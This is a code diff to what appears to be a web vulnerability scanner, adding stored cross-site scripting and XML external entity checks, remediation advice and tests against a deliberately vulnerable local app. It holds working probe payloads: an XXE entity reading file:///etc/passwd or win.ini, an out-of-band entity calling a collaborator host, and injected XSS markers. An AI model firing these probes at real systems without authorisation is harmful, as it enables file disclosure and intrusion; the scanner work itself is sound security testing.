@@ -19,6 +19,7 @@ pub enum Kind {
     Cookie,
     Json,
     Header,
+    Xml,
 }
 
 #[derive(Clone, Debug, PartialEq)]
@@ -37,6 +38,7 @@ impl Point {
             Kind::Cookie => "cookie",
             Kind::Json => "JSON parameter",
             Kind::Header => "HTTP header",
+            Kind::Xml => "XML element",
         };
         format!("{k} {}", self.name)
     }
@@ -76,6 +78,7 @@ pub fn points(req: &str) -> Vec<Point> {
     let mut pos = first_end + 2;
     let mut json = false;
     let mut form = false;
+    let mut xml = false;
     while pos < head_end {
         let end = req[pos..head_end]
             .find("\r\n")
@@ -95,6 +98,7 @@ pub fn points(req: &str) -> Vec<Point> {
                     let v = v.to_ascii_lowercase();
                     json = v.contains("json");
                     form = v.contains("x-www-form-urlencoded");
+                    xml = v.contains("xml");
                 }
                 _ => {}
             }
@@ -117,7 +121,22 @@ pub fn points(req: &str) -> Vec<Point> {
                 end: bstart + v.end(),
             });
         }
-    } else if form || (body.contains('=') && !body.trim_start().starts_with('<')) {
+    } else if xml || (!form && body.trim_start().starts_with('<')) {
+        // element text between tags, bounded; enough to carry an XXE entity reference
+        let re = regex::Regex::new(r"(?s)>([^<>]+)<").unwrap();
+        for c in re.captures_iter(body).take(5) {
+            let v = c.get(1).unwrap();
+            if v.as_str().trim().is_empty() {
+                continue;
+            }
+            out.push(Point {
+                kind: Kind::Xml,
+                name: v.as_str().trim().to_string(),
+                start: bstart + v.start(),
+                end: bstart + v.end(),
+            });
+        }
+    } else if form || body.contains('=') {
         pairs(body, bstart, '&', Kind::Body, &mut out);
     }
     out
@@ -143,6 +162,10 @@ pub fn inject(req: &str, p: &Point, value: &str) -> String {
             .replace('\n', "%0a"),
         Kind::Json => value.replace('\\', "\\\\").replace('"', "\\\""),
         Kind::Header => value.replace(['\r', '\n'], ""),
+        Kind::Xml => value
+            .replace('&', "&amp;")
+            .replace('<', "&lt;")
+            .replace('>', "&gt;"),
     };
     let quoted = p.kind == Kind::Json && !req[..p.start].ends_with('"');
     let enc = if quoted { format!("\"{enc}\"") } else { enc };
@@ -151,7 +174,7 @@ pub fn inject(req: &str, p: &Point, value: &str) -> String {
 
 // ------------------------------------------------------------ configuration
 
-pub const CHECKS: [&str; 10] = [
+pub const CHECKS: [&str; 12] = [
     "SQL injection",
     "Cross-site scripting (reflected)",
     "OS command injection",
@@ -160,8 +183,11 @@ pub const CHECKS: [&str; 10] = [
     "Open redirection",
     "HTTP response header injection",
     "Out-of-band interactions (Collaborator)",
-    "Time-based checks (slow)",
-    "HTTP request smuggling (timing)",
+    "Time-based checks (slow)",        // index 8 (disabled by fast())
+    "HTTP request smuggling (timing)", // index 9 (disabled by fast())
+    // append new checks after the fast()-disabled ones so their indices stay fixed
+    "Cross-site scripting (stored)",
+    "XML external entity injection",
 ];
 
 #[derive(Clone)]
@@ -240,6 +266,10 @@ struct Ctx {
     cookies: Mutex<String>,
     /// Collaborator payload label -> (issue context) for out-of-band findings.
     oob: Mutex<Vec<(String, &'static str, String, String)>>, // label, issue name, detail, request
+    /// Crawled in-scope paths, re-fetched when looking for stored input (stored XSS).
+    pages: Mutex<Vec<String>>,
+    /// Shared ceiling on total stored-XSS re-fetches, so point count can't explode traffic.
+    stored_left: AtomicUsize,
 }
 
 pub fn parse_url(url: &str) -> Option<(Target, String)> {
@@ -476,6 +506,14 @@ fn advice(name: &str) -> (&'static str, &'static str) {
             "A front-end and back-end server interpret request boundaries differently (Content-Length vs Transfer-Encoding), so part of one request can be treated as the start of the next, letting an attacker poison other users' requests.",
             "Make the whole chain agree on request parsing: reject messages that carry both Content-Length and Transfer-Encoding, normalise framing at the front-end, and prefer HTTP/2 end to end.",
         ),
+        "Cross-site scripting (stored)" => (
+            "Input submitted on one request is saved and later copied unescaped into a page served to other users, so an attacker's script runs in every visitor's browser in this site's context.",
+            "Encode output for its HTML context wherever stored data is rendered, validate input on the way in, and add a Content-Security-Policy.",
+        ),
+        "XML external entity injection" => (
+            "The XML parser resolves external entities declared in the document, so attacker-supplied XML can read local files or make the server issue network requests (SSRF).",
+            "Disable external entity and DTD processing in the XML parser (set it to not resolve external entities, and reject DOCTYPE declarations).",
+        ),
         _ => ("", ""),
     }
 }
@@ -520,6 +558,27 @@ fn token() -> String {
         .map(|d| d.subsec_nanos())
         .unwrap_or(7);
     format!("bc{:06}", n % 1_000_000)
+}
+
+/// Pages re-fetched per injection, and total across the scan, when hunting for stored input.
+/// ponytail: fixed caps; make them Config fields if large sites need deeper stored-XSS coverage.
+const STORED_REFETCH_CAP: usize = 20;
+const STORED_REFETCH_BUDGET: usize = 200;
+
+/// XXE probe: declares an external entity pointing at `system` and references it from the point.
+fn xxe_inject(req: &str, p: &Point, system: &str) -> String {
+    let head_end = req.find("\r\n\r\n").map_or(req.len(), |i| i + 4);
+    let body = &req[head_end..];
+    // a DOCTYPE must follow any <?xml ...?> declaration; place it right after one, else at body start
+    let decl = regex::Regex::new(r"(?s)^\s*<\?xml.*?\?>").unwrap();
+    let ins = head_end + decl.find(body).map_or(0, |m| m.end());
+    let doctype = format!("<!DOCTYPE bc [<!ENTITY xxe SYSTEM \"{system}\">]>");
+    crate::tools::fix_content_length(&format!(
+        "{}{doctype}{}&xxe;{}",
+        &req[..ins],
+        &req[ins..p.start],
+        &req[p.end..]
+    ))
 }
 
 fn audit_point(c: &Ctx, req: &str, p: &Point, base: &(Vec<u8>, Duration)) {
@@ -612,6 +671,73 @@ fn audit_point(c: &Ctx, req: &str, p: &Point, base: &(Vec<u8>, Duration)) {
                 .contains("content-type: application/json")
         {
             c.report("Cross-site scripting (reflected)", Severity::High, "Firm", format!("The value of the {lab} is copied into the response without HTML encoding: `{pl}` came back unchanged."), &r, &resp);
+        }
+    }
+    if c.cfg.on("Cross-site scripting (stored)") {
+        let tk = format!("bcs{}{}", p.start, token());
+        let pl = format!("{tk}<b>{tk}");
+        let r = inject(req, p, &pl);
+        // chase it only when it is NOT echoed straight back (that would be reflected XSS)
+        if let Some((resp, _)) = c.send(&r)
+            && !body_text(&resp).contains(&pl)
+        {
+            let pages: Vec<String> = c
+                .pages
+                .lock()
+                .unwrap()
+                .iter()
+                .take(STORED_REFETCH_CAP)
+                .cloned()
+                .collect();
+            for path in pages {
+                if c.stored_left
+                    .fetch_update(Ordering::SeqCst, Ordering::SeqCst, |n| n.checked_sub(1))
+                    .is_err()
+                {
+                    break; // scan-wide re-fetch budget spent
+                }
+                let Some((resp2, _)) = c.send(&get_request(&c.target, &path)) else {
+                    continue;
+                };
+                if body_text(&resp2).contains(&pl)
+                    && !String::from_utf8_lossy(proxy::head(&resp2))
+                        .to_ascii_lowercase()
+                        .contains("content-type: application/json")
+                {
+                    c.report("Cross-site scripting (stored)", Severity::High, "Firm", format!("The value of the {lab} is stored and later copied into {path} without HTML encoding: `{pl}` surfaced there unchanged."), &r, &resp2);
+                    break;
+                }
+            }
+        }
+    }
+    if c.cfg.on("XML external entity injection") && p.kind == Kind::Xml {
+        for (file, mark) in [
+            ("file:///etc/passwd", "root:x:0:0"),
+            ("file:///c:/windows/win.ini", "[fonts]"),
+        ] {
+            let r = xxe_inject(req, p, file);
+            if let Some((resp, _)) = c.send(&r)
+                && body_text(&resp).contains(mark)
+                && !base_body.contains(&mark.to_lowercase())
+            {
+                c.report("XML external entity injection", Severity::High, "Firm", format!("The {lab} is parsed with external entities enabled: an entity pointing at `{file}` returned content containing `{mark}`."), &r, &resp);
+                break;
+            }
+        }
+        if c.cfg.on("Out-of-band interactions (Collaborator)") {
+            let label = format!("Scan {} {lab} xxe {}", c.task, p.start);
+            let host = crate::collab::client().lock().unwrap().payload(&label);
+            if let Some(host) = host {
+                let r = xxe_inject(req, p, &format!("http://{host}/"));
+                if c.send(&r).is_some() {
+                    c.oob.lock().unwrap().push((
+                        label,
+                        "XML external entity injection",
+                        format!("The {lab} triggered an out-of-band interaction: an external entity pointed at the Collaborator server."),
+                        r,
+                    ));
+                }
+            }
         }
     }
     if c.cfg.on("File path traversal") {
@@ -885,6 +1011,7 @@ fn crawl(c: &Ctx, start: &str, status: &Mutex<String>) -> Vec<String> {
             s.next_id += 1;
             s.history.push(e);
         }
+        c.pages.lock().unwrap().push(path.clone());
         if path.contains('?') {
             audit.push(req);
         }
@@ -987,6 +1114,8 @@ pub fn start(
                 stop: stop.clone(),
                 cookies: Mutex::default(),
                 oob: Mutex::default(),
+                pages: Mutex::default(),
+                stored_left: AtomicUsize::new(STORED_REFETCH_BUDGET),
             });
             if !cfg.login.trim().is_empty() {
                 *status.lock().unwrap() = "Logging in".into();
@@ -1085,13 +1214,8 @@ pub fn start(
             let hits = crate::collab::interactions_for(&format!("Scan {id} "));
             for (c, (label, issue, detail, req)) in pending {
                 if let Some((it, _)) = hits.iter().find(|(_, l)| *l == label) {
-                    let name = if issue == "OS command injection" {
-                        "OS command injection"
-                    } else {
-                        "External service interaction"
-                    };
                     c.report(
-                        name,
+                        issue,
                         Severity::High,
                         "Certain",
                         format!(
@@ -1158,6 +1282,15 @@ mod tests {
         );
         assert!(inject(json, &jp[0], "a\"b").contains("{\"name\":\"a\\\"b\",\"age\":30}"));
         assert!(inject(json, &jp[1], "1'").contains("\"age\":\"1'\""));
+        let xml = "POST /x HTTP/1.1\r\nContent-Type: application/xml\r\nContent-Length: 42\r\n\r\n<?xml version=\"1.0\"?><data><n>bob</n></data>";
+        let xp = points(xml);
+        assert_eq!(
+            xp.iter()
+                .map(|p| (p.kind, &xml[p.start..p.end]))
+                .collect::<Vec<_>>(),
+            [(Kind::Xml, "bob")]
+        );
+        assert!(inject(xml, &xp[0], "a<b>&c").contains("<n>a&lt;b&gt;&amp;c</n>"));
         let (t, path) = parse_url("http://127.0.0.1:9/x?y=1").unwrap();
         assert_eq!(
             (t.host.as_str(), t.port, t.tls, path.as_str()),
@@ -1165,12 +1298,27 @@ mod tests {
         );
     }
 
+    #[test]
+    fn xxe_probe_substitutes_entity() {
+        let xml = "POST /x HTTP/1.1\r\nContent-Type: application/xml\r\nContent-Length: 42\r\n\r\n<?xml version=\"1.0\"?><data><n>bob</n></data>";
+        let p = &points(xml)[0];
+        let r = xxe_inject(xml, p, "file:///etc/passwd");
+        let body = r.split_once("\r\n\r\n").unwrap().1;
+        assert_eq!(
+            body,
+            "<?xml version=\"1.0\"?><!DOCTYPE bc [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data><n>&xxe;</n></data>"
+        );
+        assert_eq!(crate::tools::fix_content_length(&r), r); // Content-Length already correct
+    }
+
     /// A deliberately vulnerable web app: one endpoint per issue class plus a safe control.
     fn vulnerable_app() -> u16 {
         let srv = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
         let port = srv.local_addr().unwrap().port();
+        let store: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(vec![])); // stored-XSS sink
         std::thread::spawn(move || {
             for c in srv.incoming().flatten() {
+                let store = store.clone();
                 std::thread::spawn(move || {
                     let mut r = BufReader::new(c.try_clone().unwrap());
                     let mut head = String::new();
@@ -1202,7 +1350,7 @@ mod tests {
                     let html =
                         |b: String| ("200 OK", vec![("Content-Type", "text/html".to_string())], b);
                     let (status, headers, body) = match path {
-                        "/" => html("<a href=\"/search?q=hi\">s</a> <a href='/item?id=1'>i</a> <a href=\"/file?name=a.txt\">f</a> <a href=\"/go?url=/home\">g</a> <a href=\"/tpl?name=x\">t</a> <a href=\"/fetch?u=http://x/\">fetch</a> <a href=\"/safe?q=1\">safe</a> <img src=\"/logo.png\"> <a href=\"https://other.example/\">ext</a> <form method=post action=/login><input name=user><input type=password name=pass></form>".into()),
+                        "/" => html("<a href=\"/search?q=hi\">s</a> <a href='/item?id=1'>i</a> <a href=\"/file?name=a.txt\">f</a> <a href=\"/go?url=/home\">g</a> <a href=\"/tpl?name=x\">t</a> <a href=\"/fetch?u=http://x/\">fetch</a> <a href=\"/safe?q=1\">safe</a> <a href=\"/comment?c=hi\">add</a> <a href=\"/comments\">list</a> <img src=\"/logo.png\"> <a href=\"https://other.example/\">ext</a> <form method=post action=/login><input name=user><input type=password name=pass></form>".into()),
                         "/search" => html(format!("Results for {}", arg("q"))),
                         "/safe" => html(format!("Results for {}", crate::codec::html_encode(arg("q").as_bytes(), false))),
                         "/item" => {
@@ -1234,6 +1382,21 @@ mod tests {
                                 }
                             }
                             html("fetched".into())
+                        }
+                        "/comment" => {
+                            store.lock().unwrap().push(arg("c"));
+                            html("saved".into())
+                        }
+                        // stored input rendered unescaped on another page
+                        "/comments" => html(store.lock().unwrap().join(" | ")),
+                        // XXE: discloses the file only when the external-entity declaration is present
+                        "/xml" => {
+                            let b = String::from_utf8_lossy(&body);
+                            html(if b.contains("file:///etc/passwd") {
+                                "root:x:0:0:root:/root:/bin/bash".into()
+                            } else {
+                                "ok".into()
+                            })
                         }
                         "/.git/HEAD" => ("200 OK", vec![], "ref: refs/heads/main\n".into()),
                         "/login" => html(format!("Welcome {}", crate::codec::html_encode(arg("user").as_bytes(), false))),
@@ -1276,10 +1439,22 @@ mod tests {
             b.0.push(crate::bcheck::parse("metadata:\n name: \"Echoed marker\"\ngiven query insertion point then\n send payload:\n  replacing: \"bcmark42\"\n if \"bcmark42\" in {latest.response.body} then\n  report issue:\n   severity: info\n end if").unwrap());
         }
         let state = proxy::Shared::new();
+        let xml_body = "<?xml version=\"1.0\"?><data><name>test</name></data>";
+        let xml_req = format!(
+            "POST /xml HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nContent-Type: application/xml\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{xml_body}",
+            xml_body.len()
+        );
         let task = start(
             1,
             vec![format!("http://127.0.0.1:{port}/")],
-            vec![],
+            vec![(
+                Target {
+                    host: "127.0.0.1".into(),
+                    port,
+                    tls: false,
+                },
+                xml_req,
+            )],
             Config::fast(),
             state.clone(),
         );
@@ -1308,6 +1483,8 @@ mod tests {
             ("/tpl", "Server-side template injection"),
             ("/.git/HEAD", "Exposed git repository"),
             ("/search", "Echoed marker"),
+            ("/comment", "Cross-site scripting (stored)"),
+            ("/xml", "XML external entity injection"),
         ];
         for (p, n) in expect {
             assert!(
